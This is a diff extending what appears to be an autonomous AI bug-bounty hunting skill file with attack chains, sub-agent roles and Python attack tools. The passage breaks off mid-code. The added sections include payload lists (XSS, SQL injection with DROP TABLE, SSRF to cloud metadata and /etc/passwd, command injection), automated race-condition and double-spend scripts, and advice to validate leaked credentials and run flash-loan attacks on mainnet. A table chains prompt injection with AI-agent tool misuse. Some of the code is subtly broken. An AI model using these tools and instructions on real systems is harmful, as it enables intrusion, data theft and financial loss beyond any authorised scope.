@@ -153,6 +153,26 @@ For any interesting path, try at least these variations before giving up:
 
 ---
 
+
+## S-CLASS HUNTER MINDSET (v5.1 Additions)
+
+23. **AUTONOMOUS HYPOTHESIS GENERATION** — When the skill encounters an anomaly, it proposes novel attack paths without human prompting. "Target launched PDF export → test LaTeX injection, XXE via SVG→PDF, path traversal in temp handling."
+
+24. **FAILURE IS DATA** — Every failed PoC updates the target profile. WAF blocked `SLEEP()` → next test uses `BENCHMARK()`, `pg_sleep()`, or conditional errors. The skill learns from misses, not just hits.
+
+25. **ECONOMIC OPTIMIZATION** — Always calculate Expected Value. `EV = (probability × impact) / effort`. If Target A shows nothing after 20 min, EV drops → pivot to Target B automatically.
+
+26. **CROSS-PROGRAM PATTERN TRANSFER** — Finding email confirmation bypass on Shopify → auto-generate identical tests for Stripe, Square, BigCommerce. Anti-patterns repeat across industries.
+
+27. **PATCH-GAP HUNTING** — When a vendor patches a bug, the fix is often incomplete. Diff the patch, extract the anti-pattern, grep your target for the same pattern in adjacent code paths.
+
+28. **SECOND-ORDER THINKING** — Your input may be stored in DB/cache/log/queue and processed unsafely hours later by a different component. Map storage flows, not just request→response.
+
+29. **GHOST STATE TESTING** — Single-threaded testing misses race conditions. Use single-packet attacks, statistical timing analysis, and parallel request bursts for financial flows.
+
+30. **SEMANTIC TAINT TRACKING** — Follow attacker-controlled input through source code. If it reaches a dangerous sink without passing through a sanitizer, that's a bug regardless of whether it's in the checklist.
+
+
 ## Mode Selection
 
 Infer mode from user input. Multiple modes can be combined.
@@ -227,6 +247,14 @@ In one message, spawn all applicable agents as parallel foreground Agent calls.
 | `mobile-client-agent` | APK/IPA, Electron, game clients, deep links | Client-side apps |
 | `crypto-math-agent` | Overflow, precision, signatures | Smart contract math |
 | `economic-security-agent` | Flash loans, oracle manipulation | DeFi/protocol economics |
+| `shadow-logic-agent` | Business logic flaws, state machine violations, semantic anomalies | Any app with user flows / payment logic |
+| `patch-gap-agent` | Incomplete patches, variant vulnerabilities, "else branch" bugs | Target has public GitHub with security commits |
+| `second-order-agent` | Stored→reflected vulns, temporal bugs, queue/cache poisoning | Apps with user-generated content / async processing |
+| `weirdness-agent` | Statistical anomalies, hidden endpoints, timing side-channels | Any API target (baseline + outlier detection) |
+| `semantic-taint-agent` | Static source→sink tracking, mass assignment, auth bypass | Source code available (Python/JS/TS/Go/Rust) |
+| `ghost-state-agent` | Race conditions, TOCTOU, single-packet attacks, concurrency | Financial ops, coupons, inventory, voting |
+| `zero-context-agent` | Novel WAF bypass generation, semantic payload mutation | WAF/CDN-protected targets |
+
 
 **Flexibility Rule:** If an agent encounters something interesting outside its domain, it should probe it immediately rather than ignore it. WAF bypass agent finds SQLi? Test it. Recon agent finds leaked creds? Validate them. Don't defer — confirm now.
 
@@ -429,6 +457,69 @@ These are not theoretical. Every chain below was reported, triaged, and paid.
 ```
 
 ---
+
+
+### Chain 13: Patch-Gap Variant → Same-Class Exploit (H100 — Shopify #796808, #910300)
+**Source:** Shopify email confirmation bypass — fix was incomplete 3 times.
+```
+1. Find disclosed report + fix commit for target program
+2. Read the diff → identify the exact anti-pattern that was patched
+3. Grep target codebase for the SAME anti-pattern in adjacent functions/modules
+4. Often the developer fixed Path A but missed Path B (else branch, similar endpoint)
+5. Exploit the unpatched variant → same impact, fresh bug
+```
+**Key detail:** Use `patch_gap.py` to automate this. Feed it a patch diff, it hunts variants.
+
+### Chain 14: Second-Order Stored → Admin Dashboard XSS → ATO
+**Source:** Generic pattern found in CRMs, admin panels, analytics platforms.
+```
+1. Find user input field stored to database (profile bio, ticket title, upload filename)
+2. Verify input is sanitized on INSERT but NOT on SELECT/render
+3. Admin dashboard renders this data without escaping (different code path)
+4. Stored XSS executes in admin context → session hijack → full admin access
+```
+**Key detail:** Use `second_order_detector.py` to map storage→consumption flows automatically.
+
+### Chain 15: Semantic Taint → Mass Assignment → IDOR → Data Exfil
+**Source:** Rails/Node/Django apps with `create()`/`update()` using request body directly.
+```
+1. Static analysis finds `User.create(req.body)` with no `allowed_fields` filter
+2. Add `is_admin: true` or `role: "admin"` to registration/update request
+3. Privilege escalation confirmed
+4. Use new admin powers to access `/api/admin/users` → mass PII exfil
+```
+**Key detail:** Use `semantic_taint.py` to find source→sink flows in source code.
+
+### Chain 16: Race Condition → Double-Spend → Financial Loss
+**Source:** Coupon systems, gift cards, voting, inventory, withdrawal flows.
+```
+1. Identify endpoint with check-then-act pattern (check balance, then deduct)
+2. Send 20 parallel requests via single-packet attack (ghost_state_hunter.py)
+3. If >1 returns success → race condition confirmed
+4. Scale: redeem same coupon 1000x, withdraw same balance 10x
+```
+**Key detail:** Single-packet attacks bypass rate limits because all requests arrive atomically.
+
+### Chain 17: Behavioral Anomaly → Hidden Endpoint → Debug Feature → RCE
+**Source:** WeirdnessScorer statistical outlier detection.
+```
+1. Baseline all API endpoints for status codes, timing, content length
+2. Identify statistical outliers (one endpoint 50ms faster, returns different headers)
+3. Probe outlier with extra methods, params, headers
+4. Hidden debug endpoint discovered (`/api/.internal/health`, `/debug/exec`)
+5. Debug endpoint lacks auth → code execution or config exposure
+```
+
+### Chain 18: Economic Fuzzing → Flash Loan Manipulation → Protocol Insolvency
+**Source:** DeFi protocols with oracle-dependent pricing.
+```
+1. Simulate flash loan attack against contract state locally
+2. Calculate optimal borrow amount to maximize price impact
+3. If net profit > 0 in simulation → vulnerability is real
+4. Execute on mainnet/testnet with exact parameters from simulation
+```
+**Key detail:** Use `economic_fuzzer.py` to brute-force profitable economic attacks.
+
 
 ## TOP 1% HACKER MINDSET
 
@@ -1722,6 +1813,17 @@ Patterns extracted from 100 highest-upvoted HackerOne reports. Use for target se
 | SSRF (DNS only) | + internal access proof | Internal network access |
 | Host header injection | + password reset poisoning | ATO |
 | Self-XSS | + login CSRF | Stored XSS on victim |
+| GraphQL introspection alone | + missing field-level auth | Mass PII exfil |
+| LLM prompt injection (ASI01) | + tool misuse (ASI02) | Data exfil / RCE via AI agent |
+| AI system prompt leak | + indirect injection (ASI05) | Persistent prompt poisoning |
+| CI/CD expression injection | + secret exfiltration | Cloud account takeover |
+| Cache poisoning (unkeyed header) | + reflected XSS payload | Stored XSS on auth pages |
+| Behavioral anomaly (fast response) | + debug endpoint probe | Info disclosure / RCE |
+| Second-order stored payload | + admin dashboard render | Stored XSS → ATO |
+| Patch-gap variant | + same exploit path | Fresh bug with known impact |
+| Semantic taint (no sanitizer) | + source→sink confirmation | Auth bypass / mass assignment |
+| Race condition (double redeem) | + financial scale | Theft / double-spend |
+
 
 ---
 
@@ -1736,6 +1838,1300 @@ Patterns extracted from 100 highest-upvoted HackerOne reports. Use for target se
 **General:** Operator configuration parameters treated as attacker input, "add rate limiting" without amplification attack, "use checked_X instead of saturating_X" when upstream check exists, error messages containing HTTP status codes or generic library errors (not credentials/PII).
 
 ---
+
+---
+
+# S-CLASS MODULES (v5.1 Hidden-Bug & Autonomous Detection)
+
+These modules upgrade BountyForge from a static knowledge base to an autonomous, self-evolving hunting organism. Each module targets bug classes that checklist-based approaches miss.
+
+---
+
+## Module 1: Shadow Logic Engine (`shadow_logic.py`)
+
+**Purpose:** Infers intended business logic by observing normal behavior, then flags anomalous behavior suggesting logic flaws.
+
+**Hidden bugs caught:** Price manipulation, workflow bypass, state machine violations, mass assignment, negative quantities, privilege persistence.
+
+```python
+# shadow_logic.py
+import json
+import hashlib
+from collections import defaultdict
+from typing import Dict, List, Any, Tuple
+import requests
+import numpy as np
+from sklearn.ensemble import IsolationForest
+
+class ShadowLogicEngine:
+    """
+    Infers business rules by observing API behavior across multiple sessions,
+    then detects violations that indicate logic flaws.
+    """
+
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+        self.state_graph = defaultdict(list)
+        self.parameter_profiles = {}
+        self.response_signatures = {}
+        self.behavioral_baseline = []
+        self.isolation_model = IsolationForest(contamination=0.1, random_state=42)
+
+    def learn_normal_behavior(self, auth_tokens: List[str], iterations: int = 50):
+        print("[*] Learning normal business logic...")
+        for i in range(iterations):
+            token = auth_tokens[i % len(auth_tokens)]
+            flows = [
+                ["/api/register", "/api/login", "/api/profile", "/api/logout"],
+                ["/api/login", "/api/cart/add", "/api/cart/checkout", "/api/payment"],
+                ["/api/login", "/api/settings", "/api/password/change"],
+            ]
+            for flow in flows:
+                session_state = {}
+                for endpoint in flow:
+                    resp = self._request(endpoint, token, session_state)
+                    sig = self._behavioral_signature(resp)
+                    self.response_signatures[f"{endpoint}_{i}"] = sig
+                    session_state["last_response"] = resp
+                    if len(session_state.get("path", [])) > 0:
+                        prev = session_state["path"][-1]
+                        self.state_graph[prev].append(endpoint)
+                    session_state.setdefault("path", []).append(endpoint)
+        signatures = list(self.response_signatures.values())
+        if len(signatures) > 10:
+            self.isolation_model.fit(np.array(signatures))
+        print(f"[+] Baseline established: {len(self.response_signatures)} signatures")
+
+    def detect_logic_anomalies(self, auth_token: str) -> List[Dict]:
+        anomalies = []
+        print("[*] Testing state machine violations...")
+        valid_flows = self._extract_flows()
+        for flow in valid_flows[:5]:
+            for skip_idx in range(1, len(flow)-1):
+                skipped_flow = flow[:skip_idx] + flow[skip_idx+1:]
+                result = self._execute_flow(skipped_flow, auth_token)
+                if result["success"] and not result.get("expected_failure"):
+                    anomalies.append({
+                        "type": "STATE_SKIP",
+                        "description": f"Skipped {flow[skip_idx]} but {flow[skip_idx+1]} succeeded",
+                        "flow": skipped_flow,
+                        "severity": "HIGH",
+                        "evidence": result["response"]
+                    })
+        print("[*] Testing parameter semantic violations...")
+        for endpoint, profile in self.parameter_profiles.items():
+            for param, constraints in profile.items():
+                mutations = self._generate_semantic_mutations(constraints)
+                for mutation in mutations:
+                    resp = self._request(endpoint, auth_token, {param: mutation})
+                    if self._is_anomalous(resp, endpoint):
+                        anomalies.append({
+                            "type": "SEMANTIC_VIOLATION",
+                            "description": f"{param}={mutation} caused anomalous behavior",
+                            "endpoint": endpoint,
+                            "severity": "MEDIUM",
+                            "evidence": resp.text[:500]
+                        })
+        print("[*] Testing temporal logic...")
+        anomalies.extend(self._test_race_conditions(auth_token))
+        return anomalies
+
+    def _test_race_conditions(self, token: str) -> List[Dict]:
+        import threading
+        results = []
+        def double_redeem():
+            r1 = requests.post(f"{self.base_url}/api/coupon/redeem",
+                             headers={"Authorization": f"Bearer {token}"},
+                             json={"code": "TEST10"}, timeout=10)
+            return r1
+        responses = []
+        def collect():
+            responses.append(double_redeem())
+        threads = [threading.Thread(target=collect) for _ in range(5)]
+        for t in threads: t.start()
+        for t in threads: t.join()
+        successes = [r for r in responses if r.status_code == 200]
+        if len(successes) > 1:
+            results.append({
+                "type": "RACE_CONDITION",
+                "description": f"Coupon redeemed {len(successes)} times in parallel",
+                "severity": "CRITICAL",
+                "evidence": f"Status codes: {[r.status_code for r in responses]}"
+            })
+        return results
+
+    def _behavioral_signature(self, response) -> List[float]:
+        return [
+            len(response.text),
+            response.status_code,
+            len(response.headers),
+            hash(response.text) % 10000,
+            response.elapsed.total_seconds() * 1000,
+        ]
+
+    def _is_anomalous(self, response, endpoint) -> bool:
+        sig = self._behavioral_signature(response)
+        baseline_sigs = [s for k, s in self.response_signatures.items() if k.startswith(endpoint)]
+        if not baseline_sigs:
+            return False
+        baseline = np.array(baseline_sigs)
+        current = np.array([sig])
+        mean = np.mean(baseline, axis=0)
+        std = np.std(baseline, axis=0)
+        z_scores = np.abs((current - mean) / (std + 1e-9))
+        return np.any(z_scores > 3)
+
+    def _generate_semantic_mutations(self, constraints) -> List[Any]:
+        if constraints.get("type") == "integer":
+            return [-1, 0, 0.5, "999999999999999999", "-0", "null", "true", []]
+        elif constraints.get("type") == "string":
+            return ["", "null", "undefined", "-1", "0", "true", "false", "[]", "{}"]
+        elif constraints.get("type") == "boolean":
+            return ["true", "false", 1, 0, "yes", "no", "1", "0", None]
+        return []
+
+    def _request(self, endpoint, token, data=None):
+        return requests.get(f"{self.base_url}{endpoint}",
+                          headers={"Authorization": f"Bearer {token}"}, timeout=10)
+
+    def _extract_flows(self):
+        return [["/api/login", "/api/cart/add", "/api/cart/checkout"]]
+
+    def _execute_flow(self, flow, token):
+        return {"success": True, "response": "test"}
+
+# USAGE:
+# engine = ShadowLogicEngine("https://target.com")
+# engine.learn_normal_behavior(tokens=["token1", "token2"], iterations=20)
+# bugs = engine.detect_logic_anomalies("attacker_token")
+
+```
+
+**Trigger:** `--shadow-logic` or any target with user flows / payment logic.
+
+---
+
+## Module 2: Patch-Gap Vampire (`patch_gap.py`)
+
+**Purpose:** Analyzes security patches and hunts for unpatched variants in your target. When a developer fixes a bug in Path A, they often miss Path B.
+
+**Hidden bugs caught:** Incomplete fixes, variant vulnerabilities in cloned code, "else branch" bugs, patch-gap exploitation.
+
+```python
+# patch_gap.py
+import subprocess
+import re
+from difflib import SequenceMatcher
+from typing import List, Dict
+
+class PatchGapVampire:
+    """Analyzes security patches and hunts for unpatched variants."""
+
+    def __init__(self, target_repo: str):
+        self.target_repo = target_repo
+        self.vulnerability_patterns = []
+
+    def ingest_patch(self, patch_diff: str, vuln_type: str):
+        print(f"[*] Ingesting {vuln_type} patch...")
+        removed_lines = self._extract_removed(patch_diff)
+        added_lines = self._extract_added(patch_diff)
+        anti_pattern = {
+            "type": vuln_type,
+            "before": removed_lines,
+            "after": added_lines,
+            "missing_check": self._infer_missing_check(removed_lines, added_lines),
+            "context_window": self._extract_context(patch_diff)
+        }
+        self.vulnerability_patterns.append(anti_pattern)
+        print(f"[+] Extracted anti-pattern: {anti_pattern['missing_check']}")
+
+    def hunt_variants(self) -> List[Dict]:
+        findings = []
+        for pattern in self.vulnerability_patterns:
+            grep_cmd = f"cd {self.target_repo} && grep -rn '{pattern['missing_check']}' --include='*.py' --include='*.js' --include='*.ts' --include='*.sol'"
+            result = subprocess.run(grep_cmd, shell=True, capture_output=True, text=True)
+            for line in result.stdout.strip().split("\n"):
+                if not line:
+                    continue
+                file_path, line_no, code = self._parse_grep(line)
+                if not self._is_fixed_variant(code, pattern["after"]):
+                    context = self._get_context(file_path, int(line_no))
+                    similarity = self._context_similarity(context, pattern["context_window"])
+                    if similarity > 0.6:
+                        findings.append({
+                            "type": "PATCH_GAP_VARIANT",
+                            "original_vuln": pattern["type"],
+                            "file": file_path,
+                            "line": line_no,
+                            "code": code.strip(),
+                            "context_similarity": similarity,
+                            "confidence": "HIGH" if similarity > 0.8 else "MEDIUM",
+                            "reason": f"Same {pattern['type']} anti-pattern found in similar context, likely missed during patch"
+                        })
+        return findings
+
+    def _infer_missing_check(self, before: List[str], after: List[str]) -> str:
+        before_set = set(before)
+        added = [l for l in after if l not in before_set]
+        if added:
+            return added[0].strip()[:50]
+        return "security_check"
+
+    def _context_similarity(self, ctx1: str, ctx2: str) -> float:
+        return SequenceMatcher(None, ctx1, ctx2).ratio()
+
+    def _extract_removed(self, diff: str) -> List[str]:
+        return [l[1:] for l in diff.split("\n") if l.startswith("-") and not l.startswith("---")]
+
+    def _extract_added(self, diff: str) -> List[str]:
+        return [l[1:] for l in diff.split("\n") if l.startswith("+") and not l.startswith("+++")]
+
+    def _extract_context(self, diff: str) -> str:
+        return "\n".join([l for l in diff.split("\n") if not l.startswith("+") and not l.startswith("-")])
+
+    def _parse_grep(self, line: str):
+        parts = line.split(":", 2)
+        return parts[0], parts[1], parts[2]
+
+    def _is_fixed_variant(self, code: str, fix_pattern: List[str]) -> bool:
+        fix_text = " ".join(fix_pattern)
+        return any(f in code for f in fix_pattern)
+
+    def _get_context(self, file_path: str, line_no: int, radius: int = 5) -> str:
+        try:
+            with open(file_path) as f:
+                lines = f.readlines()
+            start = max(0, line_no - radius - 1)
+            end = min(len(lines), line_no + radius)
+            return "".join(lines[start:end])
+        except:
+            return ""
+
+# USAGE:
+# vampire = PatchGapVampire("/path/to/target/repo")
+# vampire.ingest_patch(shopify_patch_diff, "EMAIL_CONFIRMATION_BYPASS")
+# variants = vampire.hunt_variants()
+
+```
+
+**Trigger:** `--patch-gap` or target has public GitHub with security commits.
+
+---
+
+## Module 3: Second-Order Ghost Detector (`second_order_detector.py`)
+
+**Purpose:** Finds vulnerabilities where input is stored (DB, cache, log, queue) then later processed unsafely by a different component.
+
+**Hidden bugs caught:** Stored XSS via admin dashboards, SQLi via analytics, SSRF via thumbnail services, command injection via batch jobs.
+
+```python
+# second_order_detector.py
+import requests
+import time
+import json
+from typing import List, Dict, Set
+
+class SecondOrderDetector:
+    """Detects second-order vulnerabilities by tracking input through storage layers."""
+
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+        self.injection_points = []
+        self.consumption_points = []
+        self.tracking_id = 0
+
+    def map_storage_flow(self, auth_token: str):
+        print("[*] Mapping storage flows...")
+        storage_endpoints = [
+            ("/api/profile", "POST", {"bio": "PAYLOAD", "name": "PAYLOAD"}),
+            ("/api/settings", "PUT", {"nickname": "PAYLOAD"}),
+            ("/api/upload", "POST", {"filename": "PAYLOAD"}),
+            ("/api/feedback", "POST", {"message": "PAYLOAD"}),
+            ("/api/team/invite", "POST", {"email": "PAYLOAD"}),
+        ]
+        consumption_endpoints = [
+            "/api/admin/users",
+            "/api/profile/{id}",
+            "/api/reports/export",
+            "/api/search",
+            "/api/notifications",
+            "/api/analytics",
+        ]
+        for endpoint, method, template in storage_endpoints:
+            self._test_storage_endpoint(endpoint, method, template, auth_token)
+        self.consumption_points = consumption_endpoints
+        print(f"[+] Mapped {len(self.injection_points)} storage points")
+
+    def _test_storage_endpoint(self, endpoint: str, method: str, template: dict, token: str):
+        unique = f"2NDORD{self.tracking_id}"
+        self.tracking_id += 1
+        payload = {k: v.replace("PAYLOAD", unique) for k, v in template.items()}
+        if method == "POST":
+            requests.post(f"{self.base_url}{endpoint}", json=payload,
+                         headers={"Authorization": f"Bearer {token}"}, timeout=10)
+        else:
+            requests.put(f"{self.base_url}{endpoint}", json=payload,
+                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
+        time.sleep(2)
+        self.injection_points.append({
+            "endpoint": endpoint,
+            "method": method,
+            "fields": list(template.keys()),
+            "tracking_id": unique,
+            "payloads_tested": []
+        })
+
+    def hunt_second_order(self, auth_token: str, admin_token: str = None) -> List[Dict]:
+        findings = []
+        for injection in self.injection_points:
+            for field in injection["fields"]:
+                for payload_type, payloads in self._payload_library().items():
+                    for payload in payloads:
+                        self._inject(injection["endpoint"], injection["method"],
+                                   field, payload, auth_token)
+                        time.sleep(3)
+                        for consumer in self.consumption_points:
+                            result = self._check_consumption(consumer, payload,
+                                                           admin_token or auth_token)
+                            if result["triggered"]:
+                                findings.append({
+                                    "type": f"SECOND_ORDER_{payload_type}",
+                                    "storage": injection["endpoint"],
+                                    "consumption": consumer,
+                                    "field": field,
+                                    "payload": payload,
+                                    "severity": result["severity"],
+                                    "evidence": result["evidence"],
+                                    "chain": f"{injection['endpoint']} -> [storage] -> {consumer}"
+                                })
+        return findings
+
+    def _payload_library(self) -> Dict[str, List[str]]:
+        return {
+            "XSS": [
+                "<img src=x onerror=alert(1)>",
+                ""><svg onload=alert(1)>",
+                "javascript:alert(1)",
+                "${alert(1)}"
+            ],
+            "SQLI": [
+                "1' AND SLEEP(5)--",
+                "1' UNION SELECT NULL--",
+                "1; DROP TABLE users--",
+                "' OR '1'='1"
+            ],
+            "SSRF": [
+                "http://169.254.169.254/latest/meta-data/",
+                "file:///etc/passwd",
+                "dict://localhost:11211/",
+                "gopher://localhost:6379/_INFO"
+            ],
+            "SSTI": [
+                "{{7*7}}",
+                "${7*7}",
+                "<%= 7*7 %>",
+                "${{7*7}}"
+            ],
+            "COMMAND_INJECTION": [
+                "$(id)",
+                "`id`",
+                "| id",
+                "; id #"
+            ]
+        }
+
+    def _inject(self, endpoint, method, field, payload, token):
+        data = {field: payload}
+        if method == "POST":
+            requests.post(f"{self.base_url}{endpoint}", json=data,
+                         headers={"Authorization": f"Bearer {token}"}, timeout=10)
+        else:
+            requests.put(f"{self.base_url}{endpoint}", json=data,
+                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
+
+    def _check_consumption(self, endpoint: str, payload: str, token: str) -> Dict:
+        resp = requests.get(f"{self.base_url}{endpoint}",
+                          headers={"Authorization": f"Bearer {token}"}, timeout=10)
+        result = {"triggered": False, "severity": "INFO", "evidence": ""}
+        if payload in ["<img src=x onerror=alert(1)>", ""><svg onload=alert(1)>"]:
+            if "onerror=alert(1)" in resp.text or "onload=alert(1)" in resp.text:
+                result = {"triggered": True, "severity": "HIGH", "evidence": "XSS triggered in consumption"}
+        if "49" in resp.text and ("{{7*7}}" in payload or "${7*7}" in payload):
+            result = {"triggered": True, "severity": "CRITICAL", "evidence": "SSTI executed: 7*7=49"}
+        return result
+
+# USAGE:
+# detector = SecondOrderDetector("https://target.com")
+# detector.map_storage_flow("user_token")
+# bugs = detector.hunt_second_order("user_token", "admin_token")
+
+```
+
+**Trigger:** `--second-order` or any target with user-generated content / async processing.
+
+---
+
+## Module 4: Weirdness Scorer (`weirdness_scorer.py`)
+
+**Purpose:** Baselines every endpoint's behavior, then finds statistical outliers suggesting hidden functionality, debug endpoints, or unpatched vulnerabilities.
+
+**Hidden bugs caught:** Debug endpoints returning 200, timing differences revealing user enumeration, hidden admin endpoints, endpoints accepting unauthorized mutations.
+
+```python
+# weirdness_scorer.py
+import requests
+import statistics
+import json
+from collections import defaultdict
+from typing import Dict, List
+import numpy as np
+
+class WeirdnessScorer:
+    """Statistical anomaly detection for web APIs."""
+
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+        self.endpoint_baseline = {}
+        self.global_baseline = {}
+
+    def build_baseline(self, endpoints: List[str], token: str = None):
+        headers = {"Authorization": f"Bearer {token}"} if token else {}
+        for endpoint in endpoints:
+            metrics = {
+                "status_codes": [],
+                "response_times": [],
+                "content_lengths": [],
+                "header_counts": [],
+                "error_keywords": []
+            }
+            tests = [
+                ("GET", True), ("POST", True), ("PUT", True),
+                ("GET", False), ("POST", False), ("DELETE", True)
+            ]
+            for method, authed in tests:
+                h = headers if authed else {}
+                try:
+                    start = time.time()
+                    if method == "GET":
+                        r = requests.get(f"{self.base_url}{endpoint}", headers=h, timeout=5)
+                    elif method == "POST":
+                        r = requests.post(f"{self.base_url}{endpoint}", headers=h, json={}, timeout=5)
+                    elif method == "PUT":
+                        r = requests.put(f"{self.base_url}{endpoint}", headers=h, json={}, timeout=5)
+                    else:
+                        r = requests.delete(f"{self.base_url}{endpoint}", headers=h, timeout=5)
+                    metrics["status_codes"].append(r.status_code)
+                    metrics["response_times"].append((time.time() - start) * 1000)
+                    metrics["content_lengths"].append(len(r.text))
+                    metrics["header_counts"].append(len(r.headers))
+                    if r.status_code >= 400:
+                        metrics["error_keywords"].append(self._extract_error_type(r))
+                except Exception as e:
+                    metrics["status_codes"].append(0)
+                    metrics["response_times"].append(5000)
+            self.endpoint_baseline[endpoint] = metrics
+
+        all_times = [m for ep in self.endpoint_baseline.values() for m in ep["response_times"]]
+        all_lengths = [m for ep in self.endpoint_baseline.values() for m in ep["content_lengths"]]
+        self.global_baseline = {
+            "mean_time": statistics.mean(all_times),
+            "std_time": statistics.stdev(all_times) if len(all_times) > 1 else 0,
+            "mean_length": statistics.mean(all_lengths),
+            "std_length": statistics.stdev(all_lengths) if len(all_lengths) > 1 else 0,
+        }
+        print(f"[+] Baseline built for {len(endpoints)} endpoints")
+
+    def find_weird_endpoints(self) -> List[Dict]:
+        weird = []
+        for endpoint, metrics in self.endpoint_baseline.items():
+            score = 0
+            reasons = []
+            avg_time = statistics.mean(metrics["response_times"])
+            if self.global_baseline["std_time"] > 0:
+                z_time = (avg_time - self.global_baseline["mean_time"]) / self.global_baseline["std_time"]
+                if z_time > 2:
+                    score += 25
+                    reasons.append(f"Response time {avg_time:.0f}ms is {z_time:.1f}σ above mean")
+                elif z_time < -1.5:
+                    score += 15
+                    reasons.append(f"Response time {avg_time:.0f}ms suspiciously fast (static response?)")
+
+            avg_len = statistics.mean(metrics["content_lengths"])
+            if self.global_baseline["std_length"] > 0:
+                z_len = (avg_len - self.global_baseline["mean_length"]) / self.global_baseline["std_length"]
+                if abs(z_len) > 2:
+                    score += 20
+                    reasons.append(f"Content length {avg_len:.0f}b is {z_len:.1f}σ from mean")
+
+            unique_status = set(metrics["status_codes"])
+            if len(unique_status) > 3:
+                score += 20
+                reasons.append(f"Inconsistent status codes: {unique_status}")
+
+            if 200 in metrics["status_codes"] or 204 in metrics["status_codes"]:
+                score += 15
+                reasons.append("Accepts mutations without obvious auth validation")
+
+            error_types = set(metrics["error_keywords"])
+            if len(error_types) > 2:
+                score += 15
+                reasons.append(f"Verbose error diversity: {error_types}")
+
+            if score >= 40:
+                weird.append({
+                    "endpoint": endpoint,
+                    "weirdness_score": score,
+                    "reasons": reasons,
+                    "recommendation": self._recommend_probe(endpoint, reasons),
+                    "severity": "HIGH" if score >= 60 else "MEDIUM"
+                })
+        return sorted(weird, key=lambda x: x["weirdness_score"], reverse=True)
+
+    def _extract_error_type(self, response) -> str:
+        text = response.text.lower()
+        if "sql" in text or "database" in text:
+            return "DB_ERROR"
+        elif "stack trace" in text or "traceback" in text:
+            return "STACK_TRACE"
+        elif "permission" in text or "forbidden" in text:
+            return "AUTH_ERROR"
+        elif "not found" in text:
+            return "NOT_FOUND"
+        else:
+            return "OTHER_ERROR"
+
+    def _recommend_probe(self, endpoint: str, reasons: List[str]) -> str:
+        if any("time" in r for r in reasons):
+            return f"Test {endpoint} for time-based SQLi, user enumeration, or conditional auth"
+        if any("length" in r for r in reasons):
+            return f"Test {endpoint} for IDOR, mass assignment, or data exposure"
+        if any("mutation" in r for r in reasons):
+            return f"Test {endpoint} for IDOR write/delete, mass assignment"
+        return f"Deep manual testing recommended on {endpoint}"
+
+# USAGE:
+# scorer = WeirdnessScorer("https://target.com")
+# scorer.build_baseline(["/api/users", "/api/admin", "/api/public", "/api/debug"], token="xxx")
+# weird = scorer.find_weird_endpoints()
+
+```
+
+**Trigger:** `--weirdness` or any API target.
+
+---
+
+## Module 5: Semantic Taint Tracker (`semantic_taint.py`)
+
+**Purpose:** Static analysis that tracks attacker-controlled input through code to dangerous sinks without passing through validation.
+
+**Hidden bugs caught:** Mass assignment, auth bypass, SQLi, RCE, SSTI, path traversal in source code.
+
+```python
+# semantic_taint.py
+import ast
+import os
+import re
+from typing import List, Dict, Set, Tuple
+
+class SemanticTaintTracker:
+    """Lightweight static taint analysis for Python/JS web apps."""
+
+    SOURCES = [
+        "request.json", "request.args", "request.form", "request.headers",
+        "request.cookies", "request.files", "request.data", "request.get_json",
+        "req.body", "req.query", "req.params", "req.headers", "req.cookies",
+        "event.body", "event.queryStringParameters"
+    ]
+
+    SINKS = {
+        "SQLI": ["execute", "executemany", "raw", "query", "find_by_sql"],
+        "RCE": ["eval", "exec", "os.system", "os.popen", "subprocess.call", "subprocess.run"],
+        "SSTI": ["render_template", "render", "template.render", "jinja2.Template"],
+        "PATH_TRAVERSAL": ["open", "read_file", "send_file", "send_from_directory"],
+        "SSRF": ["requests.get", "requests.post", "urllib.request", "curl"],
+        "XSS": ["innerHTML", "document.write", "html", "mark_safe"],
+        "MASS_ASSIGNMENT": ["create", "update", "save", "insert", "bulk_create"]
+    }
+
+    SANITIZERS = [
+        "escape", "sanitize", "validate", "clean", "strip_tags", "bleach",
+        "htmlspecialchars", "encode", "quote", "param", "bind_param"
+    ]
+
+    def __init__(self, codebase_path: str):
+        self.codebase = codebase_path
+        self.findings = []
+
+    def analyze_file(self, file_path: str):
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                code = f.read()
+            if file_path.endswith(".py"):
+                tree = ast.parse(code)
+                self._analyze_python_ast(tree, file_path, code)
+            elif file_path.endswith((".js", ".ts")):
+                self._analyze_js(file_path, code)
+        except Exception as e:
+            pass
+
+    def _analyze_python_ast(self, tree: ast.AST, file_path: str, raw_code: str):
+        for node in ast.walk(tree):
+            if isinstance(node, ast.FunctionDef):
+                func_sources = self._find_sources_in_function(node)
+                if not func_sources:
+                    continue
+                sinks = self._find_sinks_in_function(node)
+                for source_var, source_line in func_sources:
+                    for sink_type, sink_node, sink_line in sinks:
+                        if not self._has_sanitizer_between(node, source_var, sink_node):
+                            self.findings.append({
+                                "file": file_path,
+                                "function": node.name,
+                                "source": source_var,
+                                "source_line": source_line,
+                                "sink_type": sink_type,
+                                "sink_line": sink_line,
+                                "code_snippet": raw_code.split("\n")[sink_line-1].strip(),
+                                "severity": self._severity_for_sink(sink_type),
+                                "type": f"TAINT_{sink_type}"
+                            })
+
+    def _find_sources_in_function(self, func: ast.FunctionDef) -> List[Tuple[str, int]]:
+        sources = []
+        for node in ast.walk(func):
+            if isinstance(node, ast.Assign):
+                for target in node.targets:
+                    if isinstance(target, ast.Name):
+                        value_str = ast.dump(node.value)
+                        for src in self.SOURCES:
+                            if src.replace(".", "") in value_str or src in value_str:
+                                sources.append((target.id, node.lineno))
+        return sources
+
+    def _find_sinks_in_function(self, func: ast.FunctionDef) -> List[Tuple[str, ast.AST, int]]:
+        sinks = []
+        for node in ast.walk(func):
+            if isinstance(node, ast.Call):
+                call_str = ast.dump(node)
+                for sink_type, sink_patterns in self.SINKS.items():
+                    for pattern in sink_patterns:
+                        if pattern in call_str:
+                            sinks.append((sink_type, node, node.lineno))
+        return sinks
+
+    def _has_sanitizer_between(self, func: ast.FunctionDef, source_var: str, sink_node: ast.AST) -> bool:
+        for node in ast.walk(func):
+            if isinstance(node, ast.Call):
+                call_str = ast.dump(node)
+                for san in self.SANITIZERS:
+                    if san in call_str and source_var in call_str:
+                        return True
+        return False
+
+    def _analyze_js(self, file_path: str, code: str):
+        lines = code.split("\n")
+        for i, line in enumerate(lines, 1):
+            for src in ["req.body", "req.query", "req.params", "req.headers", "req.cookies"]:
